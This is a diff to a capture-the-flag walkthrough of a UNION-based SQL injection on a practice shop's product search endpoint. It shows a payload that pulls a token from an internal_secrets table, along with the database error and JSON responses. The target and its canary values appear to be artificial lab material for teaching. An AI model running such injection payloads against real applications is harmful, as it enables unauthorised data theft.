@@ -83,11 +83,12 @@ A row of `1,2,3,4,5` shows up among the products: the single quote broke out of 
 }
 ```
 
-Getting the column count wrong is just as informative, because SQLite's error comes straight back:
+Getting the column count wrong is just as informative, because SQLite's error comes straight back, as an HTTP 500:
 
 ```json
 {
-  "error": "Raw query failed. Code: `1`. Message: `SELECTs to the left and right of UNION do not have the same number of result columns`"
+  "error": "\nInvalid `prisma.$queryRawUnsafe()` invocation:\n\n\nRaw query failed. Code: `1`. Message: `SELECTs to the left and right of UNION do not have the same number of result columns`",
+  "products": []
 }
 ```
 
@@ -120,7 +121,7 @@ Credentials are loot, not the flag. What the endpoint rewards is reading a row n
 ```
 
 ```
-users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence,internal_secrets
+users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,internal_secrets,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence
 ```
 
 `flags` is a dead end: any payload naming that table gets a `403`, and every `OSS{…}` value is stripped out of the response before it leaves the server. `internal_secrets` is the one to look at:
@@ -153,11 +154,19 @@ This endpoint only looks for its own token, so ask for the `product-search-sql-i
 ' UNION SELECT 1, token, 'x', 1, 'y' FROM internal_secrets WHERE slug='product-search-sql-injection'--
 ```
 
+An empty `LIKE` matches every product, so the whole catalogue comes back and the
+injected row sits among it — the literal `1` in the first column is what marks it:
+
 ```json
 {
   "products": [
     {
-      "id": "cmu07q2xd007miex2czfyuyzr",
+      "id": "cmua7d4i4000gienxfk8q9c9l",
+      "name": "Artisan Cheese Board",
+      "…": "…"
+    },
+    {
+      "id": "1",
       "name": "CANARY-PRODUCT-SEARCH-SQL-INJECTION-d12a4cdea6d3",
       "description": "x",
       "price": "1",
